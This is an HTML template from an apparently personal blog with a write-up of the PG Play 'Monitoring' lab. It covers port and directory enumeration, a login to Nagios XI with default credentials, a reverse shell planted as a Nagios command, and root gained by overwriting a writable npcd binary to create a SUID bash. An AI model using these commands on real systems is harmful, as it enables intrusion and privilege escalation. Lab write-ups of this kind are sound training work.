@@ -1,0 +1,208 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Monitoring</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Medium | MyRating : Medium</p>
+    <p class="text">If you could find nagios vuln for PrivEsc, it might be Easy box.</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
+|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
+|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
+25/tcp   open  smtp       Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-09-08T17:59:00
+|_Not valid after:  2030-09-06T17:59:00
+|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: TLS randomness does not represent time
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-09-08T18:28:08
+|_Not valid after:  2030-09-06T18:28:08
+|_http-title: Nagios XI
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+5667/tcp open  tcpwrapped
+Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+
+<p class="text">There are several open ports, but our targets would be https and http server.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/monitoring/1.png' %}" alt="">
+    <p class="text">When I opend http and https simultaneously, the pages returned the same pager. Also, I first enumerated http directory, but it revealed no pages. Therefore, I determined only the https page functions and http isn't the target.</p>
+</div>
+<p class="text">Gobuster successcully enumerated https pages.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster -k dir -w /usr/share/secliists/Discovery/Web-Content/common.txt -u https://$IP -t 70</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/cgi-bin/             (Status: 403) [Size: 280]
+/index.php            (Status: 200) [Size: 3245]
+/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.218.136/javascript/]
+/nagios               (Status: 401) [Size: 462]
+/server-status        (Status: 403) [Size: 280]
+
+===============================================================</code></pre></div>
+
+
+
+<p class="text">There is nagios page. It's really famous CMS, so this framework would be the main target.</p>
+<p class="text">CMS often includes tons of sub-directories and gobuster cannot enumerate them efficiently, so I switch the tool to feroxbuster and keep digging.</p>
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -k -u https://$IP > ferox</u>
+└─$ <u>cat ferox | grep -Evi 'css|png|1l|ico|js|javascript' | grep -E '200|301'</u>
+└─$ cat ferox | grep -Evi 'css|png|1l|ico|js|javascript' | grep -E '200|301'
+200      GET       75l      208w     3245c https://192.168.218.136/
+301      GET        9l       28w      323c https://192.168.218.136/nagiosxi => https://192.168.218.136/nagiosxi/
+301      GET        9l       28w      330c https://192.168.218.136/nagiosxi/images => https://192.168.218.136/nagiosxi/images/
+...</u></code></pre></div>
+
+<p class="text">Though I filtered several redundancy, there was no interesting files, and if I jump to the url enumerated, it returned login page for admin.</p>
+<p class="text">Therefore, I decided to brute force the login form.</p>
+
+<div class="code-box"><pre><code>└─$ cat ferox | grep -Evi 'css|png|1l|ico|js|javascript' | grep -E 'admin'  
+301      GET        9l       28w      329c https://192.168.218.136/nagiosxi/admin => https://192.168.218.136/nagiosxi/admin/</code></pre></div>
+<p class="text">I found admin page before I used feroxbuster. So, I will brute force this login form.</p>
+
+<p class="text">Searching <u>nagios default password</u> in google returned nagiosadmin as defautl username. Before creating python code, I will try several weak password.</p>
+
+<h2 class="subtitle">FootHold</h2>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/monitoring/2.png' %}" alt="">
+    <p class="text">Fortunately, credential <u>nagiosadmin:admin</u> let me login. Actually, I've got reverse shell on nagios when I've solved another box, so I know which module lead me to reverse shell.</p>
+</div>
+
+<p class="text">Navigating to Configure -> Core Configure Manager, There is a Commands tab, which I exploit.</p>
+<p class="text">Opening the Commands tab, there is Add New button on the top left.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/monitoring/3.png' %}" alt="">
+    <p class="text">Then, write simple reverse shell command on the Command Line filed, and name it rev_shell(whatever) and press Save button.</p>
+</div>
+<p class="text">Next, after I successfully saved the malisious command, the <u>Apply Configuration</u> column on the right table highlighted in red <u>*</u>. Simply jump to the page and confirm it.</p>
+
+<p class="text">Then, re-navigate Core Configure Manager, press Hosts button, then press localhost again.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/monitoring/4.png' %}" alt="">
+    <p class="text">You notice that we can select malisious command we generated on Chek_command tab and run it. We can get reverse shell using this. <br><br><u>※Don't forget to open port on your machine using nc.</u></p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.164] from (UNKNOWN) [192.168.166.136] 42876
+bash: cannot set terminal process group (11615): Inappropriate ioctl for device
+bash: no job control in this shell
+nagios@ubuntu:/var/spool/cron$ </code></pre></div>
+
+<p class="text">We got reverse shell.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Before enumerate user and machine info, we have to make this connection more stable.</p>
+<p class="text">I used below commands to do that.</p>
+<div class="code-box"><pre><code>script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+
+$ stty raw -echo; fg
+nc -lnvp 443
+           reset
+reset: unknown terminal type unknown
+Terminal type? screen</code></pre></div>
+
+<div class="code-box"><pre><code>nagios@ubuntu:/var/spool/cron$ sudo -l
+Matching Defaults entries for nagios on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nagios may run the following commands on ubuntu:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/ndo2db start
+    (root) NOPASSWD: /etc/init.d/ndo2db stop
+    (root) NOPASSWD: /etc/init.d/ndo2db restart
+    (root) NOPASSWD: /etc/init.d/ndo2db reload
+    (root) NOPASSWD: /etc/init.d/ndo2db status
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php
+        *
+    (root) NOPASSWD:
+        /usr/local/nagiosxi/html/includes/components/profile/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+nagios@ubuntu:/var/spool/cron$ </code></pre></div>
+
+<p class="text">We have tons of SUDO binaries, but notice there are several shell files that allow us to use any following files. So, first I will analyze them.</p>
+
+<div class="code-box"><pre><code>nagios@ubuntu:/var/spool/cron$ <u>/usr/local/nagiosxi/scripts/manage_services.sh -h</u>
+First parameter must be one of: start stop restart status reload checkconfig enable disable</code></pre></div>
+
+<p class="text">According to the help, we can start and stop arbitrary application. Therefore, If we could find any writable application, we can re-write contents and run it as root user. Let's find it.</p>
+
+<div class="code-box"><pre><code>nagios@ubuntu:/var/spool/cron$ <u>find / -type f -executable -user nagios 2>/dev/null | grep -Ev 'proc|cgi' | grep bin</u>
+/usr/local/nrdp/plugins/Generic/check_webinject.sh
+/usr/local/nagios/bin/npcd
+/usr/local/nagios/bin/nagios
+/usr/local/nagios/bin/npcdmod.o
+/usr/local/nagios/bin/nagiostats
+nagios@ubuntu:/var/spool/cron$ <u>ls -la /usr/local/nagios/bin/npcd</u>
+-rwxr-xr-- 1 nagios nagios 31664 Sep  8  2020 /usr/local/nagios/bin/npcd
+nagios@ubuntu:/var/spool/cron$ <u>ls -la /usr/local/nagios/bin/nagios</u>
+-rwxrwxr-- 1 nagios nagios 729592 Sep  8  2020 /usr/local/nagios/bin/nagios</code></pre></div>
+
+<p class="text">There are several writable and executable files. Then, let's test if we can stop or start this app.</p>
+<div class="code-box"><pre><code>nagios@ubuntu:/var/spool/cron$ <u>/usr/local/nagiosxi/scripts/manage_services.sh stop npcd</u>
+nagios@ubuntu:/var/spool/cron$ </code></pre></div>
+
+<p class="text">It doesn't return any error messages. I assume it was successful. We can add scripts to this file and restart it.</p>
+<div class="code-box"><pre><code>nagios@ubuntu:/var/spool/cron$ <u>cp /bin/bash /tmp/bash</u>
+nagios@ubuntu:/var/spool/cron$ <u>echo -e '#!/bin/bash\nchown root /tmp/bash; chmod u+s /tmp/bash' > /usr/local/nagios/bin/npcd</u>
+nagios@ubuntu:/var/spool/cron$ <u>sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</u>
+Job for npcd.service failed because a configured resource limit was exceeded. See "systemctl status npcd.service" and "journalctl -xe" for details.
+nagios@ubuntu:/var/spool/cron$ <u>/tmp/bash -p</u>
+bash-4.3# id
+uid=1001(nagios) gid=1001(nagios) euid=0(root) groups=1001(nagios),1002(nagcmd)</code></pre></div>
+
+<p class="text">We got privileg as root. You can find proof.txt under the /root dir.</p>
+
+
+</body>
+</html>
